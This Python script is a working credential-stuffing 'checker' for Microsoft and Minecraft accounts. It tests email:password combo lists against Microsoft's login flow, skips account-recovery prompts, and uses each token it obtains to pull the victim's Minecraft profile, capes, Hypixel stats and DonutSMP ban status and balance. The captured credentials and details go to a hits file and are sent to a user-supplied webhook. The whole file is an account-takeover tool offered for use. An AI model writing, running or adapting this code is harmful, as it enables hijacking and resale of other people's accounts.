import os, time, re, json, socket, random, urllib3, warnings, uuid, threading, sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import requests

import minecraft
from minecraft import Version, initglobals
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound, serverbound
from minecraft.networking.packets.serverbound.login import LoginStartPacket
from minecraft.networking.types import String, UUID

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

if not any(v.protocol == 764 for v in minecraft.KNOWN_MINECRAFT_VERSION_RECORDS):
    minecraft.KNOWN_MINECRAFT_VERSION_RECORDS.extend([
        Version('1.20.2', 764, True),
    ])
    initglobals(use_known_records=True)

def extract_chat_text(data):
    if not data: return ""
    if isinstance(data, str):
        if not (data.startswith('{') or data.startswith('[')): return data
        try: data = json.loads(data)
        except: return data
    text = ""
    if isinstance(data, dict):
        text += data.get("text", "")
        for extra in data.get("extra", []): text += extract_chat_text(extra)
    elif isinstance(data, list):
        for item in data: text += extract_chat_text(item)
    return text

def login_start_write_fields(self, packet_buffer):
    String.send(self.name, packet_buffer)
    if self.context.protocol_later_eq(764):
        val = getattr(self, 'player_uuid', None)
        if val is None: val = uuid.uuid4()
        UUID.send(str(val), packet_buffer)
LoginStartPacket.write_fields = login_start_write_fields

sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_urlPost_sFTTag(session):
    try:
        text = session.get(sFTTag_url, timeout=15).text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if match:
            sFTTag = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match:
                return match.group(1), sFTTag, session
    except:
        pass
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        
        if '#' in login_request.url and login_request.url != sFTTag_url:
            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, session
                
        elif 'cancel?mkt=' in login_request.text:
            ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group()
            pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group()
            uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
            ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True)
            fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
            token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, session
    except:
        pass
    return "None", session

def check_hypixel_stats(name):
    stats = {
        "level": "N/A",
        "first_login": "N/A",
        "last_login": "N/A",
        "bw_stars": "N/A",
        "rank": "Default",
        "playtime": "N/A"
    }
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        tx = requests.get(f'https://plancke.io/hypixel/player/stats/{name}', headers=headers, timeout=5, verify=False).text
        
        m_level = re.search(r'Level:</b> (.+?)<br/><b>', tx)
        if m_level: stats["level"] = m_level.group(1)
        
        m_first = re.search(r'<b>First login: </b>(.+?)<br/><b>', tx)
        if m_first: stats["first_login"] = m_first.group(1)
        
        m_last = re.search(r'<b>Last login: </b>(.+?)<br/>', tx)
        if m_last: stats["last_login"] = m_last.group(1)
        
        m_bw = re.search(r'<li><b>Level:</b> (.+?)</li>', tx)
        if m_bw: stats["bw_stars"] = m_bw.group(1)

        m_rank = re.search(r'<b>Rank:</b>\s*([^<]+)', tx)
        if m_rank: stats["rank"] = m_rank.group(1).strip()
    except:
        pass
    return stats

def check_donutsmp_status(mc_name, mc_uuid, mc_token):
    result = None
    disconnect_message = None
    donut_data = {
        "status": "Unbanned",
        "reason": "None",
        "time_left": "None",
        "ban_id": "None",
        "money": "N/A",
        "playtime": "N/A",
        "kills": "N/A",
        "deaths": "N/A"
    }
    
    auth_token = AuthenticationToken(username=mc_name, access_token=mc_token, client_token=uuid.uuid4().hex)
    auth_token.profile = Profile(id_=mc_uuid, name=mc_name)
    
    try:
        connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=764, allowed_versions={764})

        @connection.listener(clientbound.login.DisconnectPacket, early=True)
        def login_disconnect(packet):
            nonlocal result, disconnect_message
            try: msg = str(packet.json_data)
            except: msg = ""
            disconnect_message = msg
            result = "banned"

        @connection.listener(clientbound.login.LoginSuccessPacket, early=True)
        def login_success(packet):
            nonlocal result
            result = "unbanned"

        @connection.listener(clientbound.play.JoinGamePacket, early=True)
        def joined_server(packet):
            nonlocal result
            result = "unbanned"

        connection._connect()
        connection._handshake(next_state=2)
        
        login_start = serverbound.login.LoginStartPacket()
        login_start.name = mc_name
        login_start.player_uuid = mc_uuid
        connection.write_packet(login_start)
        
        from minecraft.networking.connection import LoginReactor
        connection.reactor = LoginReactor(connection)
        connection._start_network_thread()

        c = 0
        while result is None and c < 1200:
            time.sleep(0.01)
            c += 1
            
        try: connection.disconnect()
        except: pass

        if result == "unbanned":
            donut_data["status"] = "Unbanned"
        elif result == "banned":
            donut_data["status"] = "Banned"
            if disconnect_message:
                clean = re.sub(r'§.', '', disconnect_message)
                text_parts = re.findall(r'"text"\s*:\s*"([^"]+)"', disconnect_message)
                if text_parts:
                    full_text = ' '.join(text_parts)
                    clean_full = full_text.replace('\\n', '\n').replace('\\r', '')
                    clean_full = re.sub(r'[§&$][0-9a-fk-or]', '', clean_full, flags=re.IGNORECASE)
                    reason_match = re.search(r'\[([^\]]+)\]', clean_full)
                    if reason_match:
                        donut_data["reason"] = reason_match.group(1).strip()
                    else:
                        ban_texts = [t.strip() for t in text_parts if len(t.strip()) > 5 and 'banned' in t.lower()]
                        donut_data["reason"] = ban_texts[0][:150] if ban_texts else "Banned"
                
                time_match = re.search(r'Time Left:\s*([^\\]+?)(?:Ban ID|$)', disconnect_message, re.IGNORECASE)
                if time_match:
                    donut_data["time_left"] = time_match.group(1).strip()
                
                banid_match = re.search(r'(?:Ban ID|ID)\s*:\s*[§&$]?[0-9a-fk-or]?(#?[A-Za-z0-9]+)', disconnect_message, re.IGNORECASE)
                if banid_match:
                    donut_data["ban_id"] = banid_match.group(1).strip()

        try:
            stat_urls = [
                f"https://stats.donutsmp.net/player/{mc_name}",
                f"https://donutsmp.net/stats/{mc_name}"
            ]
            for url in stat_urls:
                try:
                    res = requests.get(url, timeout=3, verify=False)
                    if res.status_code == 200 and len(res.text) > 100:
                        st_text = res.text
                        m_money = re.search(r'(?:money|balance|coins?)\D*([\d,]+)', st_text, re.IGNORECASE)
                        if m_money: donut_data["money"] = f"${m_money.group(1)}"
                        
                        m_play = re.search(r'(?:playtime|time played)\D*([\d]+\s*(?:hours?|days?|minutes?))', st_text, re.IGNORECASE)
                        if m_play: donut_data["playtime"] = m_play.group(1)
                        
                        m_kills = re.search(r'kills?\D*([\d,]+)', st_text, re.IGNORECASE)
                        if m_kills: donut_data["kills"] = m_kills.group(1)
                        
                        m_deaths = re.search(r'deaths?\D*([\d,]+)', st_text, re.IGNORECASE)
                        if m_deaths: donut_data["deaths"] = m_deaths.group(1)
                        break
                except:
                    continue
        except:
            pass

    except Exception:
        donut_data["status"] = "Unbanned / Firewall Restricted"
    
    return donut_data

def run(input_path, output_path, user_webhook=None):
    res_dir = os.path.dirname(output_path)
    os.makedirs(res_dir, exist_ok=True)
    
    if not os.path.exists(input_path): return

    with open(input_path, 'r', encoding='utf-8', errors='replace') as f:
        lines = [line.strip() for line in f if line.strip()]

    hits_list, bad_list, capture_list = [], [], []

    for line in lines:
        if ":" not in line: continue
        email, password = line.strip().split(":", 1)
        
        session = requests.Session()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if not urlPost or not sFTTag:
            bad_list.append(line)
            continue
        
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token == "None":
            bad_list.append(line)
            continue
        
        hits_list.append(line)
        
        name = "Minecraft Account"
        player_uuid = ""
        cape_list = "None"
        hypixel_stats = {"level": "N/A", "first_login": "N/A", "last_login": "N/A", "bw_stars": "N/A", "rank": "Default"}
        donut_info = {"status": "Unbanned", "reason": "None", "time_left": "None", "ban_id": "None", "money": "N/A", "playtime": "N/A", "kills": "N/A", "deaths": "N/A"}

        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
            if r.status_code == 200:
                data = r.json()
                name = data.get("name", "Minecraft Account")
                player_uuid = data.get("id", "")
                found_capes = [c.get("alias", "") for c in data.get("capes", [])]
                if found_capes: cape_list = ", ".join(found_capes)
                
                hypixel_stats = check_hypixel_stats(name)
                if player_uuid:
                    donut_info = check_donutsmp_status(name, player_uuid, token)
        except:
            pass
        
        cap_block = (
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"Name: {name}\n"
            f"UUID: {player_uuid}\n"
            f"Capes: {cape_list}\n"
            f"DonutSMP Status: {donut_info['status']} | Reason: {donut_info['reason']} | Time Left: {donut_info['time_left']} | Ban ID: {donut_info['ban_id']}\n"
            f"Donut Money: {donut_info['money']} | Playtime: {donut_info['playtime']} | Kills: {donut_info['kills']} | Deaths: {donut_info['deaths']}\n"
            f"Hypixel Rank: {hypixel_stats['rank']}\n"
            f"Hypixel Level: {hypixel_stats['level']}\n"
            f"BedWars Stars: {hypixel_stats['bw_stars']}\n"
            f"First Login: {hypixel_stats['first_login']}\n"
            f"Last Login: {hypixel_stats['last_login']}\n"
            f"============================\n"
        )
        capture_list.append(cap_block)

        try:
            from app import send_hit_notification
            send_hit_notification(
                email=email,
                password=password,
                account_type="Minecraft Java",
                capes=cape_list,
                hypixel_level=hypixel_stats['level'],
                hypixel_rank=hypixel_stats['rank'],
                donut_status=donut_info['status'],
                donut_reason=donut_info['reason'],
                donut_time=donut_info['time_left'],
                donut_money=donut_info['money'],
                donut_playtime=donut_info['playtime'],
                user_webhook_url=user_webhook
            )
        except:
            pass

    hits_file_path = os.path.join(res_dir, "Hits.txt")
    with open(hits_file_path, 'w', encoding='utf-8') as h_file:
        h_file.write("\n".join(hits_list) + ("\n" if hits_list else ""))

    final_output = ["=== HITS [+] ===\n"]
    final_output.extend([f"{h}\n" for h in hits_list] if hits_list else ["No hits found.\n"])
    final_output.append("\n=== BAD [-] ===\n")
    final_output.extend([f"{b}\n" for b in bad_list] if bad_list else ["No bad combos.\n"])
    final_output.append("\n=== CAPTURES ===\n")
    final_output.extend(capture_list if capture_list else ["No captures available.\n"])

    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
        out.writelines(final_output)
    
